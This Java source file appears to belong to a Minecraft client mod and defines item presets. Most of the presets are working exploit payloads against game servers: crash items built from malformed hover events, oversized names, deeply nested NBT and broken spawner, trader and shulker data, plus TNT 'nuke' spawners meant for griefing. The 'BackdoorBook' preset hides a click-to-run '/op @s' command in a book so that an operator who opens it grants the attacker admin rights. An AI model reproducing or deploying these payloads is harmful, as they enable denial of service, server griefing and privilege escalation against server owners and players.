package dev.mlml.korppu.item;

import dev.mlml.korppu.KorppuMod;
import it.unimi.dsi.fastutil.ints.IntArrayList;
import it.unimi.dsi.fastutil.ints.IntList;
import net.minecraft.core.component.DataComponents;
import net.minecraft.world.entity.EquipmentSlotGroup;
import net.minecraft.world.item.component.ItemAttributeModifiers;
import net.minecraft.world.item.component.FireworkExplosion;
import net.minecraft.world.item.component.Fireworks;
import net.minecraft.world.item.enchantment.ItemEnchantments;
import net.minecraft.world.item.component.CustomData;
import net.minecraft.world.item.alchemy.PotionContents;
import net.minecraft.server.network.Filterable;
import net.minecraft.world.item.component.WrittenBookContent;
import net.minecraft.world.entity.EntityType;
import net.minecraft.world.item.component.TypedEntityData;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.effect.MobEffectInstance;
import net.minecraft.world.effect.MobEffects;
import net.minecraft.world.item.enchantment.Enchantment;
import net.minecraft.world.item.enchantment.Enchantments;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.DoubleTag;
import net.minecraft.nbt.IntArrayTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.TagParser;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.core.registries.Registries;
import net.minecraft.core.Holder;
import net.minecraft.network.chat.ClickEvent;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.Identifier;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.UUID;

public final class ItemPresets {
    private ItemPresets() {
    }

    private static final Random RNG = new Random();
    private static final String[] NOUNS = {"bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor", "hamster", "dog"};
    private static final String[] VERBS = {"kicked", "ran", "flew", "dodged", "sliced", "rolled", "died", "breathed", "slept", "killed"};
    private static final String[] ADJECTIVES = {"beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft", "hot", "vibrating", "slimy"};
    private static final String[] ADVERBS = {"slowly", "elegantly", "precisely", "quickly", "sadly", "humbly", "proudly", "shockingly", "calmly", "passionately"};
    private static final String[] PREPOSITIONS = {"down", "into", "up", "on", "upon", "below", "above", "through", "across", "towards"};

    private static ItemPresetPlaceholder p(String key, String label, String def) {
        return new ItemPresetPlaceholder(key, label, def);
    }

    public static final List<ItemPreset> ALL = List.copyOf(Arrays.asList(
            new ItemPreset("Hologram Aura", "Atomic entry parity; stores text/url payload on armor stand item",
                    List.of(
                            p("label", "Hologram Label", ""),
                            p("image_url", "Image URL", "")
                    ),
                    ctx -> {
                        ItemStack stack = new ItemStack(Items.ARMOR_STAND);
                        String label = ctx.getString("label", "");
                        String imageUrl = ctx.getString("image_url", "");
                        if (!label.isBlank()) stack.set(DataComponents.ITEM_NAME, Component.literal(label));
                        CompoundTag root = new CompoundTag();
                        root.putString("korppu_hologram_label", label);
                        root.putString("korppu_hologram_image", imageUrl);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("Big Fireball", "Spawn egg that places a large explosion fireball",
                    List.of(p("power", "Explosion Power", "10")),
                    ctx -> {
                        CompoundTag nbt = new CompoundTag();
                        nbt.putDouble("ExplosionPower", Math.max(0, ctx.getInt("power", 10)));
                        ItemStack stack = spawnEggWithEntityData(Items.COW_SPAWN_EGG, EntityType.FIREBALL, nbt, "Big Fireball");
                        return stack;
                    }),

            new ItemPreset("Big Firework", "Firework rocket with many random colorful explosions",
                    List.of(
                            p("explosions", "Explosion Count", "100"),
                            p("colors", "CommonColors per Explosion", "8"),
                            p("flight", "Flight", "1")
                    ),
                    ctx -> {
                        int explosionCount = clamp(ctx.getInt("explosions", 100), 1, 500);
                        int colorsPer = clamp(ctx.getInt("colors", 8), 1, 32);
                        int flight = clamp(ctx.getInt("flight", 1), 0, 127);
                        List<FireworkExplosion> explosions = new ArrayList<>();
                        FireworkExplosion.Shape[] shapes = FireworkExplosion.Shape.values();
                        for (int i = 0; i < explosionCount; i++) {
                            IntList colors = new IntArrayList();
                            for (int j = 0; j < colorsPer; j++) colors.add(RNG.nextInt(0xFFFFFF));
                            explosions.add(new FireworkExplosion(shapes[RNG.nextInt(shapes.length)], colors, IntList.of(), true, true));
                        }
                        ItemStack stack = new ItemStack(Items.FIREWORK_ROCKET);
                        stack.set(DataComponents.FIREWORKS, new Fireworks(flight, explosions));
                        stack.set(DataComponents.ITEM_NAME, Component.literal("Big Firework"));
                        return stack;
                    }),

            new ItemPreset("Overpowered Potion", "Splash potion with maxed effects", ctx -> {
                List<MobEffectInstance> effects = List.of(
                        new MobEffectInstance(MobEffects.STRENGTH, 200, 127),
                        new MobEffectInstance(MobEffects.SPEED, 200, 127),
                        new MobEffectInstance(MobEffects.HASTE, 200, 127),
                        new MobEffectInstance(MobEffects.JUMP_BOOST, 200, 127),
                        new MobEffectInstance(MobEffects.REGENERATION, 200, 127),
                        new MobEffectInstance(MobEffects.RESISTANCE, 200, 127),
                        new MobEffectInstance(MobEffects.INSTANT_HEALTH, 1, 127),
                        new MobEffectInstance(MobEffects.SLOWNESS, 200, 127),
                        new MobEffectInstance(MobEffects.MINING_FATIGUE, 200, 127),
                        new MobEffectInstance(MobEffects.INSTANT_DAMAGE, 1, 127),
                        new MobEffectInstance(MobEffects.NAUSEA, 200, 127),
                        new MobEffectInstance(MobEffects.BLINDNESS, 200, 127),
                        new MobEffectInstance(MobEffects.POISON, 200, 127),
                        new MobEffectInstance(MobEffects.WITHER, 200, 127),
                        new MobEffectInstance(MobEffects.LEVITATION, 200, 127)
                );
                ItemStack stack = new ItemStack(Items.SPLASH_POTION);
                stack.set(DataComponents.POTION_CONTENTS, new PotionContents(Optional.empty(), Optional.empty(), effects, Optional.empty()));
                stack.set(DataComponents.ITEM_NAME, Component.literal("Overpowered Potion"));
                return stack;
            }),

            new ItemPreset("No-Move Helmet", "Leather helmet with NaN movement speed", ctx -> {
                ItemStack stack = new ItemStack(Items.LEATHER_HELMET);
                ItemAttributeModifiers attrs = ItemAttributeModifiers.EMPTY.withModifierAdded(
                        Attributes.MOVEMENT_SPEED,
                        new AttributeModifier(Identifier.fromNamespaceAndPath("korppu", "no_move"), Double.NaN, AttributeModifier.Operation.ADD_VALUE),
                        EquipmentSlotGroup.HEAD
                );
                stack.set(DataComponents.ATTRIBUTE_MODIFIERS, attrs);
                stack.set(DataComponents.ENCHANTMENT_GLINT_OVERRIDE, true);
                stack.set(DataComponents.ITEM_NAME, Component.literal("Troll Helmet"));
                return stack;
            }),

            new ItemPreset("Infinity Spawn Egg", "Spawn egg with infinite Y position",
                    List.of(p("y", "Y Position", "Infinity")),
                    ctx -> {
                        double y;
                        String input = ctx.getString("y", "Infinity");
                        if ("Infinity".equalsIgnoreCase(input) || "Inf".equalsIgnoreCase(input)) y = Double.POSITIVE_INFINITY;
                        else y = ctx.getDouble("y", Double.POSITIVE_INFINITY);

                        double px = KorppuMod.mc.player != null ? KorppuMod.mc.player.getX() : 0;
                        double pz = KorppuMod.mc.player != null ? KorppuMod.mc.player.getZ() : 0;
                        CompoundTag nbt = new CompoundTag();
                        ListTag pos = new ListTag();
                        pos.add(DoubleTag.valueOf(px));
                        pos.add(DoubleTag.valueOf(y));
                        pos.add(DoubleTag.valueOf(pz));
                        nbt.put("Pos", pos);
                        return spawnEggWithEntityData(Items.COW_SPAWN_EGG, EntityType.COW, nbt, "Infinity Spawn Egg");
                    }),

            new ItemPreset("InfiniteEntity", "Alias of InfiniteEntity modules/items entry",
                    List.of(p("y", "Y Position", "Infinity")),
                    ctx -> {
                        double y;
                        String input = ctx.getString("y", "Infinity");
                        if ("Infinity".equalsIgnoreCase(input) || "Inf".equalsIgnoreCase(input)) y = Double.POSITIVE_INFINITY;
                        else y = ctx.getDouble("y", Double.POSITIVE_INFINITY);

                        double px = KorppuMod.mc.player != null ? KorppuMod.mc.player.getX() : 0;
                        double pz = KorppuMod.mc.player != null ? KorppuMod.mc.player.getZ() : 0;
                        CompoundTag nbt = new CompoundTag();
                        ListTag pos = new ListTag();
                        pos.add(DoubleTag.valueOf(px));
                        pos.add(DoubleTag.valueOf(y));
                        pos.add(DoubleTag.valueOf(pz));
                        nbt.put("Pos", pos);
                        return spawnEggWithEntityData(Items.COW_SPAWN_EGG, EntityType.COW, nbt, "InfiniteEntity");
                    }),

            new ItemPreset("Command Minecart Egg", "Spawn egg for command block minecart",
                    List.of(p("command", "Command", "say Hello from a command minecart!")),
                    ctx -> {
                        CompoundTag nbt = new CompoundTag();
                        nbt.putString("Command", ctx.getString("command", "say Hello from a command minecart!"));
                        nbt.putInt("DisplayOffset", 16);
                        return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.COMMAND_BLOCK_MINECART, nbt, "Command Minecart");
                    }),

            new ItemPreset("God Sword", "Netherite sword with max core enchantments", ctx -> {
                ItemStack stack = new ItemStack(Items.NETHERITE_SWORD);
                var registryManager = KorppuMod.mc.level != null ? KorppuMod.mc.level.registryAccess() : KorppuMod.mc.getConnection() != null ? KorppuMod.mc.getConnection().registryAccess() : null;
                if (registryManager == null) return stack;
                var enchReg = registryManager.lookupOrThrow(Registries.ENCHANTMENT);
                ItemEnchantments.Mutable enc = new ItemEnchantments.Mutable(ItemEnchantments.EMPTY);
                Holder<Enchantment> sharpness = enchReg.getOrThrow(Enchantments.SHARPNESS);
                Holder<Enchantment> unbreaking = enchReg.getOrThrow(Enchantments.UNBREAKING);
                Holder<Enchantment> looting = enchReg.getOrThrow(Enchantments.LOOTING);
                Holder<Enchantment> fireAspect = enchReg.getOrThrow(Enchantments.FIRE_ASPECT);
                Holder<Enchantment> mending = enchReg.getOrThrow(Enchantments.MENDING);
                enc.set(sharpness, 5);
                enc.set(unbreaking, 3);
                enc.set(looting, 3);
                enc.set(fireAspect, 2);
                enc.set(mending, 1);
                stack.set(DataComponents.ENCHANTMENTS, enc.toImmutable());
                stack.set(DataComponents.ITEM_NAME, Component.literal("God Sword"));
                stack.set(DataComponents.ENCHANTMENT_GLINT_OVERRIDE, true);
                return stack;
            }),

            new ItemPreset("Invulnerable Entity Egg", "Invisible invulnerable chest minecart", ctx -> {
                CompoundTag nbt = new CompoundTag();
                nbt.putByte("Invulnerable", (byte) 1);
                nbt.putByte("Invisible", (byte) 1);
                nbt.putByte("NoGravity", (byte) 1);
                nbt.putString("LootTable", "");
                return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.CHEST_MINECART, nbt, "Invulnerable Entity Egg");
            }),

            new ItemPreset("Stick", "Stick with nested NBT depth",
                    List.of(p("depth", "Nested Depth", "511")),
                    ctx -> {
                        int depth = clamp(ctx.getInt("depth", 511), 1, 4096);
                        ItemStack stack = new ItemStack(Items.STICK);
                        CompoundTag root = new CompoundTag();
                        CompoundTag cur = root;
                        for (int i = 0; i < depth; i++) {
                            CompoundTag next = new CompoundTag();
                            cur.put("tag", next);
                            cur = next;
                        }
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        stack.set(DataComponents.ITEM_NAME, Component.literal("Stick"));
                        return stack;
                    }),

            new ItemPreset("BackdoorBook", "Book that runs a command when clicked",
                    List.of(
                            p("title", "Title", "generateForMe"),
                            p("content", "Content", "generateForMe"),
                            p("author", "Author", "generateForMe"),
                            p("command", "Command", "/op @s")
                    ),
                    ctx -> {
                        String title = ctx.getString("title", "generateForMe");
                        String content = ctx.getString("content", "generateForMe");
                        String author = ctx.getString("author", "generateForMe");
                        String command = ctx.getString("command", "/op @s");
                        if ("generateForMe".equalsIgnoreCase(title)) title = randomTitle();
                        if ("generateForMe".equalsIgnoreCase(content)) content = randomContent();
                        if ("generateForMe".equalsIgnoreCase(author)) {
                            author = KorppuMod.mc.player != null ? KorppuMod.mc.player.getName().getString() : "Player";
                        }
                        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
                        MutableComponent page = Component.literal(content + " ".repeat(500))
                                .withStyle(s -> s.withClickEvent(new ClickEvent.RunCommand(command)));
                        stack.set(DataComponents.WRITTEN_BOOK_CONTENT,
                                new WrittenBookContent(Filterable.passThrough(title), author, 0, List.of(Filterable.passThrough(page), Filterable.passThrough(Component.empty())), true));
                        return stack;
                    }),

            new ItemPreset("Atomic Fireball", "Atomic-style fireball with configurable strength",
                    List.of(p("strength", "Strength", "10")),
                    ctx -> {
                        int strength = clamp(ctx.getInt("strength", 10), 0, 127);
                        CompoundTag nbt = new CompoundTag();
                        nbt.putDouble("ExplosionPower", strength);
                        return spawnEggWithEntityData(Items.BLAZE_SPAWN_EGG, EntityType.FIREBALL, nbt, "Fireball");
                    }),

            new ItemPreset("Blockban", "Area effect cloud barrier particle spam",
                    List.of(
                            p("duration", "Duration", "1310700"),
                            p("wait", "Wait Time", "60"),
                            p("particle", "Particle", "minecraft:barrier")
                    ),
                    ctx -> {
                        CompoundTag nbt = new CompoundTag();
                        nbt.putString("Particle", ctx.getString("particle", "minecraft:barrier"));
                        nbt.putFloat("RadiusPerTick", 0f);
                        nbt.putInt("Duration", Math.max(1, ctx.getInt("duration", 1310700)));
                        nbt.putInt("WaitTime", Math.max(0, ctx.getInt("wait", 60)));
                        return spawnEggWithEntityData(Items.COW_SPAWN_EGG, EntityType.AREA_EFFECT_CLOUD, nbt, "Blockban");
                    }),

            new ItemPreset("Lagmor Stand", "Armor stand with huge custom name",
                    List.of(p("length", "Name Length", "32000")),
                    ctx -> {
                        int len = clamp(ctx.getInt("length", 32000), 1, 64000);
                        ItemStack stack = new ItemStack(Items.ARMOR_STAND);
                        stack.set(DataComponents.CUSTOM_NAME, Component.literal("0".repeat(len)));
                        return stack;
                    }),

            new ItemPreset("No Entity Kill", "Chest minecart entity marked invulnerable/invisible", ctx -> {
                CompoundTag nbt = new CompoundTag();
                nbt.putString("LootTable", "");
                nbt.putByte("Invulnerable", (byte) 1);
                nbt.putByte("Invisible", (byte) 1);
                nbt.putByte("NoGravity", (byte) 1);
                return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.CHEST_MINECART, nbt, "No Entity Kill");
            }),

            new ItemPreset("Executor Book", "Written book with clickable run-command",
                    List.of(
                            p("title", "Title", "Open me"),
                            p("author", "Author", ""),
                            p("text", "Component", "Click to execute"),
                            p("command", "Command", "/say hi")
                    ),
                    ctx -> {
                        String author = ctx.getString("author", "");
                        if (author.isBlank() && KorppuMod.mc.player != null) author = KorppuMod.mc.player.getName().getString();
                        String command = ctx.getString("command", "/say hi");
                        if (command.isBlank()) return ItemStack.EMPTY;

                        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
                        MutableComponent page = Component.literal(ctx.getString("text", "Click to execute") + " ".repeat(500))
                                .withStyle(s -> s.withClickEvent(new ClickEvent.RunCommand(command)));
                        stack.set(DataComponents.WRITTEN_BOOK_CONTENT,
                                new WrittenBookContent(Filterable.passThrough(ctx.getString("title", "Open me")), author, 0, List.of(Filterable.passThrough(page), Filterable.passThrough(Component.empty())), true));
                        return stack;
                    }),

            new ItemPreset("Custom Meta", "Arbitrary item id + custom NBT (legacy root)",
                    List.of(
                            p("item_id", "Item ID", "minecraft:stick"),
                            p("custom_nbt", "Custom NBT", "{}")
                    ),
                    ctx -> {
                        Identifier id = Identifier.tryParse(ctx.getString("item_id", "minecraft:stick"));
                        if (id == null) return ItemStack.EMPTY;
                        Item item = BuiltInRegistries.ITEM.getOptional(id).orElse(null);
                        if (item == Items.AIR) return ItemStack.EMPTY;
                        ItemStack stack = new ItemStack(item);
                        CompoundTag nbt = parseCompound(ctx.getString("custom_nbt", "{}"));
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(nbt));
                        return stack;
                    }),

            new ItemPreset("Crash Trader", "Wandering trader payload from Atomic", ctx -> {
                CompoundTag nbt = parseCompound("{Offers:{Recipes:[{buyB:{id:\"minecraft:dirt\",Count:1b},sell:{id:\"minecraft:stick\",Count:1b}}]},NoAI:1b}");
                return spawnEggWithEntityData(Items.WANDERING_TRADER_SPAWN_EGG, EntityType.WANDERING_TRADER, nbt, "Crash Trader");
            }),

            new ItemPreset("Crash Shulker", "Shulker with suspicious block entity tags",
                    List.of(p("loot_table", "LootTable", " ")),
                    ctx -> {
                        ItemStack stack = new ItemStack(Items.WHITE_SHULKER_BOX);
                        CompoundTag blockEntityTag = new CompoundTag();
                        blockEntityTag.putString("LootTable", ctx.getString("loot_table", " "));
                        blockEntityTag.putString("id", "minecraft:shulker_box");

                        CompoundTag root = new CompoundTag();
                        root.put("BlockEntityTag", blockEntityTag);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("Cmd Block Spawner", "Spawner with command-block falling block payload",
                    List.of(p("command", "Command", "say hi")),
                    ctx -> {
                        String command = ctx.getString("command", "say hi");
                        String nbt = "{BlockEntityTag:{SpawnCount:1,SpawnRange:5,MinSpawnDelay:1,MaxSpawnDelay:1,SpawnData:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:command_block\"},TileEntityData:{Command:\"" + esc(command) + "\"},Time:1},SpawnPotentials:[{Weight:1,Entity:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:command_block\"},TileEntityData:{Command:\"" + esc(command) + "\"},Time:1}}]}}";
                        ItemStack stack = new ItemStack(Items.SPAWNER);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(parseCompound(nbt)));
                        return stack;
                    }),

            new ItemPreset("Cmd Minecart Egg", "Spawn egg for command block minecart",
                    List.of(p("command", "Command", "say hi")),
                    ctx -> {
                        CompoundTag nbt = new CompoundTag();
                        nbt.putString("Command", ctx.getString("command", "say hi"));
                        nbt.putInt("DisplayOffset", 16);
                        return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.COMMAND_BLOCK_MINECART, nbt, "Cmd Minecart");
                    }),

            new ItemPreset("Spawner Nuke", "High-volume configurable spawner",
                    List.of(
                            p("entity_id", "Entity ID", "minecraft:tnt"),
                            p("spawn_count", "Spawn Count", "64"),
                            p("spawn_range", "Spawn Range", "80"),
                            p("entity_nbt", "Entity NBT", "{}")
                    ),
                    ctx -> {
                        String id = ctx.getString("entity_id", "minecraft:tnt");
                        int count = clamp(ctx.getInt("spawn_count", 64), 1, 32766);
                        int range = clamp(ctx.getInt("spawn_range", 80), 1, 32766);
                        CompoundTag extra = parseCompound(ctx.getString("entity_nbt", "{}"));
                        extra.putString("id", id);

                        CompoundTag root = new CompoundTag();
                        CompoundTag be = new CompoundTag();
                        be.putInt("SpawnCount", count);
                        be.putInt("SpawnRange", range);
                        be.putInt("MinSpawnDelay", 0);
                        be.putInt("MaxNearbyEntities", 10000);
                        be.putInt("MaxSpawnDelay", 0);
                        be.put("SpawnData", extra.copy());
                        ListTag potentials = new ListTag();
                        CompoundTag entry = new CompoundTag();
                        entry.putInt("Weight", 1);
                        entry.put("Entity", extra.copy());
                        potentials.add(entry);
                        be.put("SpawnPotentials", potentials);
                        root.put("BlockEntityTag", be);

                        ItemStack stack = new ItemStack(Items.SPAWNER);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("Nuclear Bomb", "TNT-spawning spawner payload",
                    List.of(
                            p("fuse", "TNT Fuse", "120"),
                            p("spawn_count", "Spawn Count", "2048")
                    ),
                    ctx -> {
                        int fuse = clamp(ctx.getInt("fuse", 120), 0, 32766);
                        int count = clamp(ctx.getInt("spawn_count", 2048), 1, 32766);
                        String snbt = "{BlockEntityTag:{SpawnCount:" + count + ",SpawnRange:80,MinSpawnDelay:40,MaxNearbyEntities:" + count + ",MaxSpawnDelay:40,SpawnData:{id:\"minecraft:tnt\",Fuse:" + fuse + "},SpawnPotentials:[{Weight:1,Entity:{id:\"minecraft:tnt\",Fuse:" + fuse + "}}]}}";
                        ItemStack stack = new ItemStack(Items.SPAWNER);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(parseCompound(snbt)));
                        return stack;
                    }),

            new ItemPreset("Targetted Ender Pearl", "Spawn egg with forged Owner UUID",
                    List.of(p("uuid", "Target UUID", "00000000-0000-0000-0000-000000000000")),
                    ctx -> {
                        UUID uuid;
                        try {
                            uuid = UUID.fromString(ctx.getString("uuid", "00000000-0000-0000-0000-000000000000"));
                        } catch (Exception ignored) {
                            return ItemStack.EMPTY;
                        }
                        CompoundTag nbt = new CompoundTag();
                        nbt.put("Owner", new IntArrayTag(uuidToIntArray(uuid)));
                        return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.ENDER_PEARL, nbt, "Targetted Ender Pearl");
                    }),

            new ItemPreset("Poof 3", "Hover-based Poof payload fish",
                    List.of(p("name", "Displayed Name", "Sam the Salmon")),
                    ctx -> {
                        String exploit = "{\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"type\":\"minecraft:bat\",\"id\":\"\\u0000\"}},\"text\":\"" + esc(ctx.getString("name", "Sam the Salmon")) + "\"}";
                        ItemStack stack = new ItemStack(Items.SALMON);
                        CompoundTag display = new CompoundTag();
                        display.putString("Name", exploit);
                        CompoundTag root = new CompoundTag();
                        root.put("display", display);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("Crash Spawner", "Legacy high-range spawner crash payload",
                    List.of(p("spawn_count", "Spawn Count", "32766")),
                    ctx -> {
                        int count = clamp(ctx.getInt("spawn_count", 32766), 1, 32766);
                        String snbt = "{BlockEntityTag:{SpawnCount:" + count + ",SpawnRange:32766,Delay:0,MinSpawnDelay:0,MaxSpawnDelay:0,MaxNearbyEntities:32766,RequiredPlayerRange:32766}}";
                        ItemStack stack = new ItemStack(Items.SPAWNER);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(parseCompound(snbt)));
                        stack.set(DataComponents.ITEM_NAME, Component.literal("fucky wucky"));
                        return stack;
                    }),

            new ItemPreset("Crash Fireball", "Fireball with extreme power vector",
                    List.of(p("power_z", "Power Z", "1.0E20")),
                    ctx -> {
                        double powerZ = ctx.getDouble("power_z", 1.0E20d);
                        CompoundTag nbt = new CompoundTag();
                        ListTag power = new ListTag();
                        power.add(DoubleTag.valueOf(0d));
                        power.add(DoubleTag.valueOf(0d));
                        power.add(DoubleTag.valueOf(powerZ));
                        nbt.put("power", power);
                        return spawnEggWithEntityData(Items.BAT_SPAWN_EGG, EntityType.FIREBALL, nbt, "Crash Fireball");
                    }),

            new ItemPreset("CUM POTION", "Splash potion with stacked custom effects",
                    List.of(
                            p("effects", "Effect Count", "33"),
                            p("amplifier", "Amplifier", "124"),
                            p("duration", "Duration", "80")
                    ),
                    ctx -> {
                        int effects = clamp(ctx.getInt("effects", 33), 1, 255);
                        int amp = clamp(ctx.getInt("amplifier", 124), 0, 127);
                        int duration = Math.max(1, ctx.getInt("duration", 80));
                        ItemStack stack = new ItemStack(Items.SPLASH_POTION);
                        stack.set(DataComponents.ITEM_NAME, Component.literal("THE CUM BEAST"));

                        CompoundTag root = new CompoundTag();
                        ListTag list = new ListTag();
                        for (int i = 0; i < effects; i++) {
                            CompoundTag e = new CompoundTag();
                            e.putByte("Id", (byte) i);
                            e.putByte("Amplifier", (byte) amp);
                            e.putInt("Duration", duration);
                            list.add(e);
                        }
                        root.put("CustomPotionEffects", list);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("InfiniSculk", "Sculk catalyst payload with configurable position",
                    List.of(
                            p("x", "X", "0"),
                            p("y", "Y", "64"),
                            p("z", "Z", "0"),
                            p("charge", "Charge", "300")
                    ),
                    ctx -> {
                        int x = ctx.getInt("x", 0);
                        int y = ctx.getInt("y", 64);
                        int z = ctx.getInt("z", 0);
                        int charge = clamp(ctx.getInt("charge", 300), 1, 1000000);

                        CompoundTag cursor = parseCompound("{charge:" + charge + ",decay_delay:1,facings:[],pos:[I;" + x + "," + y + "," + z + "],update_delay:1}");
                        ListTag cursors = new ListTag();
                        for (int i = 0; i < 32; i++) cursors.add(cursor.copy());

                        CompoundTag blockEntityTag = new CompoundTag();
                        blockEntityTag.put("cursors", cursors);
                        blockEntityTag.putString("id", "minecraft:sculk_catalyst");

                        CompoundTag root = new CompoundTag();
                        root.put("BlockEntityTag", blockEntityTag);

                        ItemStack stack = new ItemStack(Items.SCULK_CATALYST);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    }),

            new ItemPreset("Nuke", "Spawner payload from modules/items/Nuke.java",
                    List.of(p("tnt_fuse", "TNT Fuse", "120")),
                    ctx -> {
                        int fuse = clamp(ctx.getInt("tnt_fuse", 120), 0, 32766);
                        String snbt = "{BlockEntityTag:{MinSpawnDelay:1,MaxSpawnDelay:1,SpawnRange:100,SpawnCount:50,MaxNearbyEntities:32766,SpawnData:{entity:{id:\"minecraft:tnt\",HasVisualFire:1b,Fuse:" + fuse + "}},SpawnPotentials:[{weight:1,data:{entity:{id:\"minecraft:tnt\",HasVisualFire:1b,Fuse:" + fuse + ",NoGravity:1b,Motion:[0.0d,2.0d,0.0d]}}},{weight:1,data:{entity:{id:\"minecraft:tnt\",HasVisualFire:1b,Fuse:" + fuse + ",NoGravity:1b,Motion:[0.0d,-2.0d,0.0d]}}}]}}";
                        ItemStack stack = new ItemStack(Items.SPAWNER);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(parseCompound(snbt)));
                        return stack;
                    }),

            new ItemPreset("Plague", "Area effect cloud plague payload",
                    List.of(
                            p("duration_seconds", "Duration (seconds)", "60"),
                            p("spread_radius", "Radius Per Tick", "0.3")
                    ),
                    ctx -> {
                        int duration = Math.max(1, ctx.getInt("duration_seconds", 60)) * 20;
                        float spread = ctx.getFloat("spread_radius", 0.3f);
                        CompoundTag nbt = new CompoundTag();
                        nbt.putInt("Duration", duration);
                        ListTag effects = new ListTag();
                        CompoundTag effect = new CompoundTag();
                        effect.putByte("Amplifier", (byte) 125);
                        effect.putInt("Duration", 2000);
                        effect.putByte("Id", (byte) 6);
                        effects.add(effect);
                        nbt.put("Effects", effects);
                        nbt.putString("Particle", "barrier");
                        nbt.putFloat("Radius", 1.0f);
                        nbt.putFloat("RadiusPerTick", spread);
                        nbt.putInt("ReapplicationDelay", 0);
                        return spawnEggWithEntityData(Items.SKELETON_SPAWN_EGG, EntityType.AREA_EFFECT_CLOUD, nbt, "Plague");
                    }),

            new ItemPreset("Poof", "Simple Poof payload fish",
                    List.of(p("item_name", "Displayed Name", "Sam the Salmon")),
                    ctx -> {
                        String exploit = "{\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"type\":\"minecraft:bat\",\"id\":\"\\u0000\"}},\"text\":\"" + esc(ctx.getString("item_name", "Sam the Salmon")) + "\"}";
                        ItemStack stack = new ItemStack(Items.SALMON);
                        CompoundTag display = new CompoundTag();
                        display.putString("Name", exploit);
                        CompoundTag root = new CompoundTag();
                        root.put("display", display);
                        stack.set(DataComponents.CUSTOM_DATA, CustomData.of(root));
                        return stack;
                    })
    ));

    private static ItemStack spawnEggWithEntityData(Item egg, EntityType<?> type, CompoundTag entityData, String name) {
        ItemStack stack = new ItemStack(egg);
        stack.set(DataComponents.ENTITY_DATA, TypedEntityData.of(type, entityData));
        stack.set(DataComponents.ITEM_NAME, Component.literal(name));
        return stack;
    }

    private static CompoundTag parseCompound(String snbt) {
        try {
            return TagParser.parseCompoundFully(snbt == null || snbt.isBlank() ? "{}" : snbt);
        } catch (Exception ignored) {
            return new CompoundTag();
        }
    }

    private static int clamp(int value, int min, int max) {
        return Math.max(min, Math.min(max, value));
    }

    private static int[] uuidToIntArray(UUID uuid) {
        long msb = uuid.getMostSignificantBits();
        long lsb = uuid.getLeastSignificantBits();
        return new int[]{(int) (msb >> 32), (int) msb, (int) (lsb >> 32), (int) lsb};
    }

    private static String esc(String value) {
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static String randomContent() {
        return "The " + randomFrom(ADJECTIVES) + " " + randomFrom(NOUNS) + " " + randomFrom(ADVERBS) + " " + randomFrom(VERBS)
                + " because some " + randomFrom(NOUNS) + " " + randomFrom(ADVERBS) + " " + randomFrom(VERBS)
                + " " + randomFrom(PREPOSITIONS) + " a " + randomFrom(ADJECTIVES) + " " + randomFrom(NOUNS) + ".";
    }

    private static String randomTitle() {
        return "The " + randomFrom(ADJECTIVES) + " tale of a " + randomFrom(NOUNS);
    }

    private static String randomFrom(String[] values) {
        return values[RNG.nextInt(values.length)];
    }
}
